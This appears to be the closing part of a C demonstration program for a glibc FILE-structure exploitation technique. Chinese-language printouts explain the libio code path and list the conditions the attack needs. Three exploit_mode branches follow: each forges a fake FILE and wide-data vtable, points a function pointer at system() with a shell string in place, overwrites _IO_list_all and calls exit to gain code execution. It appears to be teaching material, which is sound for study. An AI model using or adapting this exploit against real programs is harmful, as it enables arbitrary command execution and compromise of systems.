                 "      _IO_switch_to_main_wget_area (fp);\n"
                 "      if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)\n"
                 "\treturn *fp->_wide_data->_IO_read_ptr;\n"
                 "    }\n"
                 "  if (_IO_have_markers (fp))\n"
                 "    {\n"
                 "      if (save_for_wbackup (fp, fp->_wide_data->_IO_read_end))\n"
                 "\treturn WEOF;\n"
                 "    }\n"
                 "  else if (_IO_have_backup (fp))\n"
                 "    _IO_free_wbackup_area (fp);\n"
                 "  return _IO_UNDERFLOW (fp);\n"
                 "}\n"
                 "libc_hidden_def (__wunderflow)\n\n");

    printf_color(GREEN, UNDEFINED, "其中有一个_IO_in_put_mode宏定义：");
    printf_color(YELLOW, HIGHLIGHT, "#define _IO_in_put_mode(_fp) ((_fp)->_flags & _IO_CURRENTLY_PUTTING) // _IO_CURRENTLY_PUTTING == 0x800\n");
    printf_color(GREEN, UNDEFINED, "再来到_IO_switch_to_wget_mode函数：\n");
    printf_color(BLUE, HIGHLIGHT, "(/libio/wgenops.c, line 390)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "int\n"
                 "_IO_switch_to_wget_mode (FILE *fp)\n"
                 "{\n"
                 "  if (" HIGHLIGHT_GREEN_HEAD "fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base" HIGHLIGHT_PURPLE_HEAD ")\n"
                 "    if ((wint_t)" HIGHLIGHT_YELLOW_HEAD "_IO_WOVERFLOW (fp, WEOF)" HIGHLIGHT_PURPLE_HEAD " == WEOF)\n"
                 "      return EOF;\n"
                 "  if (_IO_in_backup (fp))\n"
                 "    fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_backup_base;\n"
                 "  else\n"
                 "    {\n"
                 "      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_buf_base;\n"
                 "      if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_read_end)\n"
                 "\tfp->_wide_data->_IO_read_end = fp->_wide_data->_IO_write_ptr;\n"
                 "    }\n"
                 "  fp->_wide_data->_IO_read_ptr = fp->_wide_data->_IO_write_ptr;\n"
                 "\n"
                 "  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr\n"
                 "    = fp->_wide_data->_IO_write_end = fp->_wide_data->_IO_read_ptr;\n"
                 "\n"
                 "  fp->_flags &= ~_IO_CURRENTLY_PUTTING;\n"
                 "  return 0;\n"
                 "}\n"
                 "libc_hidden_def (_IO_switch_to_wget_mode)\n\n");

    printf_color(GREEN, UNDEFINED, "在这里调用WOVERFLOW函数指针。\n");
    printf_color(GREEN, UNDEFINED, "总结一下这条路径需要的构造条件：\n");
    printf_color(YELLOW, HIGHLIGHT, "A. FILE->_mode > 0 (_IO_flush_all_lockp 控制流判断条件，__wunderflow 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "B. FILE->_wide_data->_IO_write_ptr > FILE->_wide_data->_IO_write_base (_IO_flush_all_lockp 控制流判断条件，_IO_switch_to_wget_mode 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "C. rdx != 0 (_IO_wdefault_xsgetn 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "D. FILE->_wide_data->_IO_read_end - FILE->_wide_data->_IO_read_ptr <= 0 (_IO_wdefault_xsgetn 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "E. FILE->_flags & 0x800 != 0 (__wunderflow 控制流判断条件)\n");
    printf_color(YELLOW, HIGHLIGHT, "F. FILE->_wide_data->_wide_vtable + 0x18 == 要执行的代码地址 (OVERFLOW函数指针偏移0x18)\n\n");

#if exploit_mode == 1

    // (/libio/genops.c, line 701): fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    fake_FILE->_mode = 0;
    fake_FILE->_IO_write_ptr = (char*)1;
    fake_FILE->_IO_write_base = (char*)0;
    ((size_t*)fake_FILE)[0xD8 / 8] = libc_base + 0x2160C0; // vtable, 0x215F40, 0x216000
    fake_FILE->_wide_data = fake_wide_data;
    ((size_t*)fake_FILE->_wide_data)[0xE0 / 8] = (size_t)fake_vtable;   // _wide_data->_wide_vtable
    ((size_t*)fake_FILE->_wide_data)[0x18 / 8] = 0;
    fake_vtable[0x68 / 8] = (size_t)system;     // _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取
    strcpy((char*)fake_FILE, binsh);
    *(_IO_list_all) = (size_t)fake_FILE;
    exit(0);

#elif exploit_mode == 2

    fake_FILE->_mode = 0;
    fake_FILE->_IO_write_ptr = (char*)1;
    fake_FILE->_IO_write_base = (char*)0;
    fake_FILE->_IO_read_end = (char*)1;
    ((size_t*)fake_FILE)[0xD8 / 8] = libc_base + 0x216000; // vtable
    fake_FILE->_wide_data = fake_wide_data;
    ((size_t*)fake_FILE->_wide_data)[0xE0 / 8] = (size_t)fake_vtable;   // _wide_data->_wide_vtable
    fake_vtable[0x68 / 8] = (size_t)system;     // _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取
    strcpy((char*)fake_FILE, binsh);
    *(_IO_list_all) = (size_t)fake_FILE;
    exit(0);

#elif exploit_mode == 3

    fake_FILE->_mode = 1;
    fake_FILE->_wide_data = fake_wide_data;
    ((size_t*)fake_FILE)[0xD8 / 8] = libc_base + 0x215AC0 + 0x28; // vtable
    ((size_t*)fake_FILE->_wide_data)[0xE0 / 8] = (size_t)fake_vtable;   // _wide_data->_wide_vtable
    ((size_t*)fake_FILE->_wide_data)[0x20 / 8] = 1;     // _wide_data->_IO_write_ptr, o+0x20
    fake_vtable[0x18 / 8] = (size_t)system;     // _IO_WOVERFLOW调用的函数指针
    strcpy((char*)fake_FILE, binsh2);       // sh => 0x6873, 0x6873 & 0x800 != 0

    *(_IO_list_all) = (size_t)fake_FILE;
    exit(0);

#endif
}
```
